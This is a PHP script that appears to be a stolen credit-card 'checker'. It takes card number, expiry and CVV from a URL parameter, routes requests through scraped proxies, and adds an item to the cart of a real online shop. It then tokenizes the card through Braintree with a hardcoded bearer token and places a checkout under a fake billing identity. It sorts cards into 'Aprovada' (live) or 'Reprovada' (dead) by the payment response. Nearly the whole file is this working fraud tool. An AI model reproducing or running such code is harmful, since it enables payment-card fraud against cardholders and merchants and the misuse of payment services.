<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$site = file_get_contents('https://www.sslproxies.org/');
preg_match_all("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}<\/td><td>[0-9]{1,5}/", $site, $matches);

foreach ($matches[0] as $proxylist) {
  fwrite(fopen('proxy.txt', "a"), str_replace('</td><td>', ':', $proxylist) . "\r\n");
}
extract($_GET); 
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$email = "bert".rand(1, 200000)."@gmail.com";
$name = "bsja".rand(1, 200000);
$last = "nakab".rand(1, 200000);
$street = "nssk".rand(1, 200000);
$city = "jsjn".rand(1, 200000);
$state = "ctih".rand(1, 200000);
$phone = rand(1, 200000);
$zip = rand (10000, 99999);
If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
If(substr($mes,0,1) == 0)
{
  $mes1 = substr($mes,1,1);
}else {
    $mes1 = $mes;
}

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "mastercard";
}else if($cbin == "4"){
$cbin = "visa";
}else if($cbin == "3"){
$cbin = "amex";
}
 $bin = substr($cc,0,6);
 $first4 = substr($cc,0,4);
 $second4 = substr($cc, 4,4);
 $third4 = substr($cc, 8, 4);
 $last4 = substr($cc,12,4);
 $last2 = substr($cc, 14,2);

 $surnames = preg_split('//', 'montecalvo');
shuffle($surnames);
foreach($surnames as $surname) {
  
}
$t=time();
$date = (date("Ymdhs",$t));

$trans = rand(1,21);

switch ($trans) {
  case '1':
  $code = 'BA5 6ZH';
    break;
  case '2':
  $code = 'WF7 7HG';
    break;
  case '3':
  $code = 'CA6 9AG';
    break;
  case '4':
  $code = 'IV13 1UG';
    break;
  case '5':
  $code = 'TD1 2PY';
    break;
  case '6':
  $code = 'DG8 1XH';
    break;
  case '7':
  $code = 'AB35 3WW';
    break;
  case '8':
  $code = 'IP28 0LN';
    break;
  case '9':
  $code = 'GL15 6BU';
    break;
  case '10':
  $code = 'HU16 6RT';
    break;
      case '11':
  $code = 'HU09 6RT';
    break;
      case '12':
  $code = 'HU17 6RT';
    break;
      case '13':
  $code = 'HU10 6RT';
    break;
      case '14':
  $code = 'HU18 6RT';
    break;
      case '15':
  $code = 'HU16 7RT';
    break;
      case '16':
  $code = 'HU26 6RT';
    break;
      case '17':
  $code = 'HU13 6RT';
    break;
      case '18':
  $code = 'HU20 6RT';
    break;
      case '19':
  $code = 'HU21 6RT';
    break;
      case '20':
  $code = 'HU16 3RT';
    break;

  default:
  $code = 'AB13 6NL';


}

                    function numGenerate($length = 10) {
                        $characters = '0123456789';
                        $charactersLength = strlen($characters);
                        $randomString = '0';
                        for ($i = 0; $i < $length; $i++) {
                            $randomString .= $characters[rand(0, $charactersLength - 1)];
                        }
                        return $randomString."";
                    }
                    $randnum = numGenerate();

$color = str_pad(dechex(rand(0x000000, 0xFFFFFF)), 6, 0, STR_PAD_LEFT);


//$rp1 = array(
  //  1 => 'mahina:malakas',
//);
//$passwd = $rp1[array_rand($rp1)];
//$proxy = 'gate.smartproxy.com:7000';
//# Proxy API
//$ch = curl_init('https://api.ipify.org/');
//curl_setopt_array($ch, [
  //  CURLOPT_RETURNTRANSFER => true,
    //CURLOPT_PROXY => $proxy,
    //CURLOPT_PROXYUSERPWD => $passwd,
    //CURLOPT_HTTPGET => true,
//]);
//$ip1 = curl_exec($ch);
//curl_close($ch);
//ob_flush();
//if (isset($ip1)){
  //  $ip = "Live! ✅";
//}
//if (empty($ip1)){
  //  $ip = "Dead![".$passwd."] ❌";
//}
  //---------------------------------------------------------------------------------------------
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.biom8.com/product/seborrheic-dermatitis-the-owners-manual/');
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
'authority: www.biom8.com',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.biom8.com',
'referer: https://www.biom8.com/product/seborrheic-dermatitis-the-owners-manual/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.55',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'quantity=1&add-to-cart=354');
echo$atc = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.biom8.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
'authority: www.biom8.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'referer: https://www.biom8.com/cart/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.55',
));
$checkout = curl_exec($ch);
curl_close($ch);
$nonce = GetStr($checkout, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NDYyMzY4MDksImp0aSI6IjliZDFmZmM1LTg3MTEtNDNiYi05ZmIzLWQ1ZGE0ZWI4NmFiNSIsInN1YiI6IjgzdGg0NHo1aHg0ZmhibmsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjgzdGg0NHo1aHg0ZmhibmsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJpb204Y2FuYWRhaW5jVVNEIn19.kQStsFaQSG1--uHEUntkm2zqS9_Kla9L35W2fEPXcdB4yYA2wXAvOmM7-q3e1V2y7qSffOaoxx4rxy6a7Xarkg',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://assets.braintreegateway.com/',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"1e33d352-0ce7-49fd-adef-674675c4a258"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
  $pagamento = curl_exec($ch);
 $goods = json_decode($pagamento, true);
 $tok = $goods['data']['tokenizeCreditCard']['token'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.biom8.com/?wc-ajax=checkout');
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
'authority: www.biom8.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.biom8.com',
'referer: https://www.biom8.com/checkout/',
'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.55',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=ben&billing_last_name=ben&billing_country=US&billing_address_1=1523+Stellar+Dr&billing_address_2=&billing_city=Kenai&billing_state=AK&billing_postcode=99611&billing_phone=19072832799&billing_email=banwidth%40zxc.com&account_password=&order_comments=&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=18.99&wc_braintree_credit_card_payment_nonce='.$tok.'&wc_braintree_device_data=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=0a768c09c3&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 $pagamento = curl_exec($ch);



  $err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"');
 //-----------------------------------------------------

if (strpos($pagamento, "success") !== false)
{

 echo "<font size=2 color='$color'><font class='badge badge-success'>Aprovada ♛ ™ <i class='zmdi zmdi-check'></i></font> $lista $err <font class='badge badge-success'>CVV Matched </i> </font><br>";

}elseif (strpos($pagamento, "The provided address does not match the billing address for cardholder. Please verify the address and try again.")) 
{
 echo "<font size=2 color='$color'><font class='badge badge-success'>Aprovada ♛ ™ <i class='zmdi zmdi-check'></i></font> $lista $err <font class='badge badge-success'>CVV Matched </i> </font><br>";
}elseif (strpos($pagamento, "Insufficient funds in account, please use an alternate card or other form of payment.")) 
{
 echo "<font size=2 color='$color'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $lista <font class='badge badge-warning'>[CVV Insufficient Funds] </i> </font><br>";
}

else if(empty($err))
{

 echo "<font size=2 color='$color'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv $pagamento</font><br>";

}


else
{
  echo "<font size=2 color='$color'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv $err|$ip1</font><br>";

}




curl_close($ch);
unlink('cookie.txt');
ob_flush();
//echo $pagamento;

?>